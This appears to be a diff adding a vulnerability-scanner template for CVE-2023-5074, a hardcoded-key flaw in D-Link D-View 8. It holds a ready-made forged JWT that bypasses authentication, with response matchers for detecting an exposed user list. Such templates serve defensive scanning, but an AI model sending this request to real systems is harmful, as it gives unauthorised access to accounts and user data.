@@ -1,0 +1,28 @@
+id: poc-yaml-d-link-d-view-8-hard-coded-key
+info:
+  name: D-Link D-View 8 Hardcoded Key Vulnerability (CVE-2023-5074)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: CVE-2023-5074,hardcoded-credentials
+http:
+  - raw:
+      - |
+        GET /dview8/api/usersByLevel HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: eyJhbGciOiAiSFMyNTYiLCJ0eXAiOiAiand0In0.eyJvcmdJZCI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODA5YWEiLCJ1c2VySWQiOiAiNTkxNzFkNTYtZTZiNC00Nzg5LTkwZmYtYTdhMjdmZDQ4NTQ4IiwidHlwZSI6IDMsImtleSI6ICIxMjM0NTY3OC0xMjM0LTEyMzQtMTIzNC0xMjM0NTY3ODkwYmIiLCJpYXQiOiAxNjg2NzY1MTk4LCJqdGkiOiAiZmRhOGU1YzNlNWY1MTQ5MDMzZThiM2FkNWI3ZDhjMjUiLCJuYmYiOiAxNjg2NzYxNTk4LCJleHAiOiAxODQ0NDQ1MTk4fQ.5swhQdiev4r8ZDNkJAFVkGfRTIaUQlwVue2AI18CrcI
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code" : 200'
+          - 'userName'
+          - '"success" : true'
+      - type: word
+        part: body
+        words:
+          - '<'
+        negative: true
